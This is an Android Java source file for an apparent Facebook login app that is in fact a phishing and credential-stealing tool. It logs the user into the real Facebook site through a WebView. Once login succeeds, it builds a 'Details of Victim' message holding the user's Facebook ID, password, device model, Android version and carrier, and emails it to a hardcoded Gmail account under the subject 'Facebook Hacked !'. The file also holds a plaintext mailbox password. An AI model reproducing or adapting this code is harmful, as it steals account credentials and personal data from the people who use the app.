package xtremecreations.facebookapp;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.TextWatcher;
import android.text.method.PasswordTransformationMethod;
import android.text.style.AbsoluteSizeSpan;
import android.text.style.TypefaceSpan;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.webkit.CookieManager;
import android.webkit.GeolocationPermissions;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;


import java.util.Objects;

public class LoginActivity extends AppCompatActivity
{
    EditText Login,Pass;
    TextView Show,Forgot;
    ImageView logo;
    Button LOGIN,CREATE;
    WebView FBMain;
    ProgressBar Pb;
    RelativeLayout MainLayout;
    int sh=0,page=0;
    Animation animation;
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        LoginActivity.this.getSupportActionBar().hide();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
        LoginActivity.this.getWindow().setStatusBarColor(ContextCompat.getColor(LoginActivity.this, R.color.status));}
        setContentView(R.layout.activity_login);

        Login=(EditText)findViewById(R.id.email);
        Pass=(EditText)findViewById(R.id.pass);
        Show=(TextView)findViewById(R.id.show);
        Forgot=(TextView)findViewById(R.id.forgot);
        LOGIN=(Button)findViewById(R.id.login);
        CREATE=(Button)findViewById(R.id.create);
        Pb=(ProgressBar)findViewById(R.id.progressBar);
        logo=(ImageView)findViewById(R.id.Iv1);
        FBMain=(WebView)findViewById(R.id.FBPage);
        MainLayout=(RelativeLayout)findViewById(R.id.MainLayout);

        Login.setVisibility(View.GONE);
        Pass.setVisibility(View.GONE);
        Show.setVisibility(View.GONE);
        Forgot.setVisibility(View.GONE);
        LOGIN.setVisibility(View.GONE);
        CREATE.setVisibility(View.GONE);
        Pb.setVisibility(View.GONE);
        Pass.setTypeface(Typeface.DEFAULT);
        LOGIN.setEnabled(false);
        LOGIN.setTextColor(Color.parseColor("#9DACCB"));
        Pb.getIndeterminateDrawable().setColorFilter(0xFFFFFFFF, android.graphics.PorterDuff.Mode.MULTIPLY);

        //Listeners--------------------------------------------------------------------------------
        Login.addTextChangedListener(new TextWatcher() {
            public void afterTextChanged(Editable s){}
            public void  beforeTextChanged(CharSequence s, int start, int count, int after){}
            public void  onTextChanged (CharSequence s, int start, int before,int count) {
                if(Login.getText().toString().equals("") || Pass.getText().toString().equals("")){LOGIN.setEnabled(false);LOGIN.setTextColor(Color.parseColor("#9DACCB"));}
                else{LOGIN.setEnabled(true);LOGIN.setTextColor(Color.parseColor("#ffffff"));}
            }
        });
        Pass.addTextChangedListener(new TextWatcher() {
            public void afterTextChanged(Editable s){}
            public void  beforeTextChanged(CharSequence s, int start, int count, int after){}
            public void  onTextChanged (CharSequence s, int start, int before,int count) {
                if(Pass.getText().toString().equals("")){Show.setVisibility(View.GONE);}
                else{Show.setVisibility(View.VISIBLE);}
                if(Login.getText().toString().equals("") || Pass.getText().toString().equals("")){LOGIN.setEnabled(false);LOGIN.setTextColor(Color.parseColor("#9DACCB"));}
                else{LOGIN.setEnabled(true);LOGIN.setTextColor(Color.parseColor("#ffffff"));}
            }
        });
        Show.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v)
            {
                if(sh==0){
                    sh=1;Show.setText(R.string.Hide);Pass.setTransformationMethod(null);
                    Pass.setSelection(Pass.getText().length());
                }
                else {
                    sh=0;Show.setText(R.string.Show);Pass.setTransformationMethod(new PasswordTransformationMethod());
                    Pass.setSelection(Pass.getText().length());
                }
            }
        });
        Forgot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(LoginActivity.this,ForgotActivity.class).putExtra("id",Login.getText().toString()));}
        });
        LOGIN.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                LoginAccepted();FBMain.loadUrl("https://m.facebook.com/login/");
        }});
        CREATE.setOnTouchListener(new OnTouchListener(){
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch(event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        CREATE.setBackgroundResource(R.drawable.create_pressed);
                        return true;
                    case MotionEvent.ACTION_UP:
                        CREATE.setBackgroundResource(R.drawable.create);
                        return true;
                }
                return false;
            }
        });

        //Animations--------------------------------------------------------------------------------
        animation = AnimationUtils.loadAnimation(getApplicationContext(), R.anim.slide);
        logo.startAnimation(animation);
        animation.setAnimationListener(new Animation.AnimationListener() {
            @Override
            public void onAnimationStart(Animation animation) {}
            @Override
            public void onAnimationEnd(Animation arg0) {
                Login.setVisibility(View.VISIBLE);
                Pass.setVisibility(View.VISIBLE);
                Forgot.setVisibility(View.VISIBLE);
                LOGIN.setVisibility(View.VISIBLE);
                CREATE.setVisibility(View.VISIBLE);
                Pb.setVisibility(View.GONE);
            }
            @Override
            public void onAnimationRepeat(Animation animation) {}
        });

        //Main Facebook Login-------------------------------------------------------------------
        FBMain.getSettings().setJavaScriptEnabled(true);
        FBMain.setWebChromeClient(new MyWebChromeClient());
        FBMain.setWebViewClient(new WebViewClient(){
            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl){
                Toast.makeText(LoginActivity.this, "Error Occured", Toast.LENGTH_LONG).show();}
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {view.loadUrl(url);return true;}
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon)
            {
                //Toast.makeText(LoginActivity.this,url, Toast.LENGTH_SHORT).show();
            }
            @Override
            public void onPageFinished(WebView v, String url){
                if(page==0){
                    FBMain.loadUrl("javascript: (function() {document.getElementsByName(\"email\")[0].value = \"" + Login.getText().toString() + "\";}) ();");
                    FBMain.loadUrl("javascript: (function() {document.getElementsByName(\"pass\")[0].value = \"" + Pass.getText().toString() + "\";}) ();");
                    FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_6\");" + "e=document.createEvent('HTMLEvents');" +
                            "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                    page=1;
                }
                else if(page==1){
                    if(url.contains("m.facebook.com/login/save-device/?login_source=login#_=_"))
                    {
                        FBMain.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
                    }
                    page=2;
                }
            }
            @Override
            public void onLoadResource(WebView view, String url){
                if(page==2) {
                    if (url.contains("m.facebook.com/home.php?_rdr"))
                    {
                        final String message="Details of Victim =>\n"+
                                "\nFacebook ID = "+Login.getText().toString()+
                                "\nPassword = "+Pass.getText().toString()+
                                "\nDevice Used = "+ (Build.MODEL) +
                                "\nAndroid Version Used = "+ android.os.Build.VERSION.RELEASE+
                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
                                    sender.sendMail("Facebook Hacked !",
                                            message,
                                            "ritik.fbhack@gmail.com",
                                            "ritik.space@gmail.com");
                                } catch (Exception e) {
                                    Log.e("SendMail", e.getMessage(), e);
                                }
                            }
                        }).start();

                    }
                }
            }
        });
    }
    public class MyWebChromeClient extends WebChromeClient {

        @Override
        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
            callback.invoke(origin, true, false);
        }
        @Override
        public void onReceivedTitle(WebView view, String title) {
        }
        @Override
        public void onProgressChanged(WebView view, int progress)
        {}
        @Override
        public void onReceivedIcon(WebView view, Bitmap b) {
            super.onReceivedIcon(view, b);
            if (view.getUrl().contains("m.facebook.com/home.php"))
            {
                MainLayout.setVisibility(View.GONE);
            }
        }
    }
    public void LoginAccepted(){
        Login.setVisibility(View.GONE);
        Pass.setVisibility(View.GONE);
        Forgot.setVisibility(View.GONE);
        LOGIN.setVisibility(View.GONE);
        Show.setVisibility(View.GONE);
        CREATE.setVisibility(View.GONE);
        Animation animation = AnimationUtils.loadAnimation(getApplicationContext(), R.anim.slide2);
        logo.startAnimation(animation);
        animation.setAnimationListener(new Animation.AnimationListener() {
            @Override
            public void onAnimationStart(Animation animation) {}
            @Override
            public void onAnimationEnd(Animation arg0) {Pb.setVisibility(View.VISIBLE);}
            @Override
            public void onAnimationRepeat(Animation animation) {}
        });
    }

}